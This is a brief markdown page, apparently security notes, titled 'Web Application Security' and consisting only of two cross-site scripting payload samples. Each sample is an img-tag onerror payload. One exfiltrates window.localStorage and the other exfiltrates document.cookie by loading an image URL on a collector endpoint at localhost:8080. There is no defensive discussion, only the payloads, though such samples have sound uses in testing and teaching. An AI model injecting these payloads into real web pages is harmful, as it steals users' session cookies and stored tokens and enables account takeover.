#Web Application Security

###Sample of XSS

#### Local Storage
```
<img src=x onerror=this.onerror=null;this.src='http://localhost:8080/api/cookie/collect.gif?cookie='+encodeURIComponent(JSON.stringify(window.localStorage)) />
```

#### Cookie
```
<img src=x onerror=this.onerror=null;this.src='http://localhost:8080/api/cookie/collect.gif?cookie='+document.cookie />
```